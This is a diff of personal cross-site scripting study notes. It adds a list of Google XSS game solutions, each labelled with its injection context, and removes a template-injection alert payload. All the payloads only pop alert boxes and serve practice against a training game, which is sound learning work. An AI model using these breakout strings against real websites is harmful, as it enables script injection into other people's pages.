@@ -35,10 +35,14 @@ onerror=alert(1) <- adding an element with false link and generating alert in er
 
 + generating an error to check
 ' <- try single-quote(') to check for any error within page or console
--------------------------------------------------------------------------------------
-[+] Misllaneous
-- create alert for timer functions
-timer}}' + alert(1) + '{{timer
 
+------------------------------------------------------------------------------------
+[+] Google's XSS game solutions
+
+1. <script>alert(1)</script>                        // context -> within html
+2. <a href="" onclick="alert(1)">click Me</a>       // context -> within html
+3. 'onerror="alert(1)"                              // context -> within html tags ( img attributes )
+4. ');alert(1,'                                     // context -> within javascript
+5. javascript:alert(1)                              // context -> within html tags ( a attributes )
+6. data:text/javascript:alert('XSS')                // context -> ?? ( still evaluating , in request )
 -------------------------------------------------------------------------------------
-Google XSS Game Solutions: https://gist.github.com/djadmin/737a77b87d0bad8a9c79
